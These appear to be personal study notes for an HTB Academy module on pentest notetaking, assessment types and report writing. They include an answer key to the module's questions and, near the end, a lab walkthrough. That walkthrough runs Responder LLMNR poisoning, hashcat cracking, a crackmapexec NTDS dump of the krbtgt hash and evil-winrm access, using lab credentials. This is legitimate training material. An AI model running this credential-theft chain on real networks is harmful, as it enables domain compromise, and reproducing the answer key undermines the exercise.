# Documentation & Reporting (HTB Supplementary)

HTB Academy module, covers notetaking discipline, assessment taxonomy, report structure, finding quality, and a practice lab that chains LLMNR poisoning through to Domain Admin. Authors: c0rndogs, mrb3n.

Cross-reference [[SysReptor]] (our actual reporting tool of choice vs WriteHat used in this lab).

---

Tags: #Documentation #Reporting #AssessmentTypes #PentestReport #HTBSupplementary #Tmux #Notetaking #FindingQuality

---

## Module Q&A Answers

| Section | Answer |
|---------|--------|
| WPE.1 Notetaking Q1 | `Tmux` |
| WPE.1 Notetaking Q2 | `[Ctrl] + [B] + [Shift] + [%]` |
| Types of Reports Q1 | `Vulnerability Assessment` |
| Types of Reports Q2 | `Black Box` |
| Components of a Report Q1 | `Executive Summary` |
| Components of a Report Q2 | `False` |
| How to Write Up a Finding Q1 | `Bad` |
| Practice Lab Q1 | `d0c_pwN_r3p0rt_reP3at!` |
| Practice Lab Q2 | `16e26ba33e455a8c338142af8d89ffbc` |
| Practice Lab Q3 | `Reporter1!` |
| Practice Lab Q4 | `Backup Operators` |

---

## DR.1. Notetaking and Organization

### Tmux for session logging

Tmux is a terminal multiplexer that keeps sessions alive across disconnections and lets you split the terminal into panes. Logging output within Tmux makes it easy to reconstruct what happened during a test.

```bash
# Start a new named session
tmux new -s pentest

# Key bindings (Ctrl+B is the prefix):
# Ctrl+B + %           → split pane vertically (left/right)
# Ctrl+B + "           → split pane horizontally (top/bottom)
# Ctrl+B + arrow key   → move between panes
# Ctrl+B + z           → toggle zoom on current pane
# Ctrl+B + d           → detach session (stays running in background)

# Re-attach to a named session
tmux attach -t pentest
```

**Q1 answer:** `Tmux`
**Q2 answer:** `[Ctrl] + [B] + [Shift] + [%]` (vertical split, left/right panes)

> 📸 Screenshot: Tmux session with a vertical split showing command output on the left and notes on the right

🔁 Similar to: [[Pre-Engagement Kali Setup]] for the broader session setup workflow.

### What to capture in notes

Every finding needs these elements at time of discovery (not reconstructed after):
- **Timestamp** of when you ran the command
- **Exact command** run (copy/paste, not paraphrased)
- **Full output** (screenshot AND text)
- **Target IP/hostname** the command ran against
- **Your IP** (especially if the target logs inbound connections)
- **What it means** — one sentence on why this matters

Without these, writing the report later requires either memory reconstruction (inaccurate) or re-running tests (which may not reproduce).

---

## DR.2. Types of Assessments

### Assessment taxonomy

| Type | Automation | Exploitation? | Goal |
|------|-----------|---------------|------|
| **Vulnerability Assessment** | Mostly automated | No | Identify and rate vulnerabilities |
| **Penetration Test** | Manual + tools | Yes | Demonstrate exploitability + business impact |
| **Red Team Assessment** | Manual, stealthy | Yes | Simulate APT; test people + process + technology |
| **Bug Bounty** | Manual | Scoped | Find specific vuln classes for a reward |

**Q1 answer:** `Vulnerability Assessment` (mostly automated, no exploitation attempted)

### Knowledge levels (testing perspective)

| Level | What the tester knows |
|-------|----------------------|
| **Black Box** | Company name + network connection only. No credentials, no architecture info. |
| **Gray Box** | Some info: network ranges, low-priv user accounts, architecture overview. Most realistic. |
| **White Box** | Full: source code, admin creds, architecture diagrams, network maps. Thoroughest coverage. |

**Q2 answer:** `Black Box` (only company name + network connection provided)

🔍 Worth remembering generally: most real-world external + internal penetration tests are gray box. Black box is the most realistic from an adversary perspective but the least efficient for the client's budget. White box finds the most vulnerabilities but doesn't test detection/response.

---

## DR.3. Components of a Report

### Report structure overview

```
1. Cover Page
2. Table of Contents
3. Executive Summary     ← non-technical, for management/board
4. Scope and Methodology ← what was tested and how
5. Findings              ← the meat; technical details for remediation teams
6. Appendices            ← raw tool output, scope lists, evidence
```

### Executive Summary rules

**Q1 answer:** `Executive Summary` (written in simple, non-technical language)

The Executive Summary is for decision-makers who may not be technical. Rules:
- Plain language: no acronyms or technical jargon without definition
- Business impact language: "An attacker could steal customer data" not "the RCE allows arbitrary code execution"
- Summarize the overall risk posture in one paragraph
- List the top 3-5 most critical findings briefly
- Do NOT name or recommend specific vendors for remediation

**Q2 answer:** `False` (naming specific vendors in exec summaries is not good practice)

Reason: recommending specific vendors creates actual or perceived bias. Clients should evaluate solutions against their own requirements. Pentesters describe the problem; the client chooses the solution.

### Finding components (what every finding needs)

| Component | Purpose |
|-----------|---------|
| **Title** | Short, descriptive (e.g. "SMB Signing Disabled — NTLM Relay Attack") |
| **Severity** | CVSS score + qualitative label (Critical/High/Medium/Low/Informational) |
| **Description** | What is the vulnerability and why does it exist |
| **Proof of Concept** | The exact steps to reproduce + screenshots + commands |
| **Business Impact** | What an attacker could do with this and what the consequence is to the business |
| **Recommendations** | Concrete, actionable steps for remediation |

CVSS scoring factors: CVSS Base = AV (attack vector) + AC (complexity) + PR (privileges required) + UI (user interaction) + S (scope) + C/I/A (confidentiality/integrity/availability impact).

---

## DR.4. How to Write Up a Finding

### Remediation recommendation quality

A good recommendation is:
- **Specific**: names the exact system/config/setting to change
- **Actionable**: tells the remediation team exactly what to do, not just what to fix
- **Consequence-aware**: explains what happens if not fixed
- **Vendor-neutral**: describes the required security control, not a specific product

**Example of a bad recommendation:**
> "An attacker can own your whole entire network cause your DC is way out of date. You should really fix that!"

Why it's bad: vague, no specific vulnerability named, no remediation steps, unprofessional tone.

**Example of a good recommendation:**
> "Apply the latest cumulative security patches to all Domain Controllers. As of [date], KB5020683 is the most current for Windows Server 2019. Enable Windows Update on a test DC first, validate functionality, then roll out via WSUS/SCCM. Unpatched DCs running Windows Server 2012 R2 are vulnerable to CVE-2022-37967 (Kerberos privilege elevation) which allows domain compromise without user interaction."

**Q1 answer:** `Bad` (the example given is a bad remediation recommendation)

---

## DR.5. WriteHat — Practice Lab Reporting Tool

WriteHat is an open-source pentest reporting tool deployed as a Docker container. In the practice lab it runs at `https://STMIP:443`.

Key features: web-based finding database, markdown support, PDF export, template management, multi-user collaboration.

> ⚠️ We use [[SysReptor]] (cloud.sysreptor.com) as our actual reporting tool, not WriteHat. WriteHat is only in this module's lab environment. See [[SysReptor]] for the setup and workflow we use for OSCP reports.

---

## DR.6. Practice Lab — Completing the In-Progress Pentest

The lab picks up from partially completed notes left by a previous tester. Key credentials already in the Obsidian notes:

| Credential | Source |
|-----------|--------|
| `dhawkins:Bacon1989` | Found in lab notes |
| `Administrator:Welcome123!` | Found in lab notes |
| `asmith:Welcome1` | Found in lab notes |
| `abouldercon:Welcome1` | Found in lab notes |

Internal network targets: DC01 = 172.16.5.5, DEV01 = 172.16.5.200, FILE01 = 172.16.5.130.

### Chain: LLMNR poisoning → DA flag

```bash
# Step 1: start Responder on the internal interface
sudo responder -I ens224 -wrvf

# Wait for backupagent to authenticate — captures NTLMv2 hash

# Step 2: crack the hash
hashcat -w 3 -O -m 5600 "BACKUPAGENT::INLANEFREIGHT:..." /usr/share/wordlists/rockyou.txt
# Result: Recovery7

# Step 3: RDP to DC as backupagent
xfreerdp /v:172.16.5.5 /u:backupagent /p:Recovery7

# Step 4: read flag on Administrator Desktop
type C:\Users\Administrator\Desktop\flag.txt
```

**Q1 answer:** `d0c_pwN_r3p0rt_reP3at!`

> 📸 Screenshot: Responder capturing backupagent hash, hashcat cracking to Recovery7, then flag on DC01 Desktop

### NTDS dump for krbtgt hash

🔁 Similar to: [[Active Directory#DCSync|DCSync / NTDS dump]] in the AD appendix.

```bash
sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds
# Dumps all hashes including krbtgt:502:...:16e26ba33e455a8c338142af8d89ffbc:::
```

**Q2 answer:** `16e26ba33e455a8c338142af8d89ffbc` (krbtgt NTLM hash)

### Offline crack for svc_reporting

```bash
grep "svc_reporting" /root/.cme/logs/DC01_172.16.5.5_*.ntds
# svc_reporting:7608:...:a6d3701ae426329951cf5214b7531140:::

hashcat -w 3 -O -m 1000 "a6d3701ae426329951cf5214b7531140" /usr/share/wordlists/rockyou.txt
# Result: Reporter1!
```

**Q3 answer:** `Reporter1!`

### Group membership enumeration

```bash
evil-winrm -i 172.16.5.5 -u backupagent -p Recovery7

# Inside Evil-WinRM:
net user svc_reporting
# Shows: Local Group Memberships: *Backup Operators
```

**Q4 answer:** `Backup Operators`

> 📸 Screenshot: Evil-WinRM session, `net user svc_reporting` showing Backup Operators membership

---

## Related Boxes

This module is theory-focused. The practice lab techniques map to:
- [[Active Directory]] appendix for LLMNR/Responder and NTDS dump
- [[SysReptor]] for actual reporting workflow
- Any box with a full write-up as the deliverable

For reporting practice: [[Lame]], [[Beep]], [[Legacy]] (HTB retiring boxes with official write-ups) are good references for what a complete finding narrative looks like.

---

#### Tags: #Documentation #Reporting #AssessmentTypes #PentestReport #HTBSupplementary #Tmux #Notetaking #FindingQuality #WriteHat #CVSS #ExecutiveSummary #BlackBox #VulnerabilityAssessment
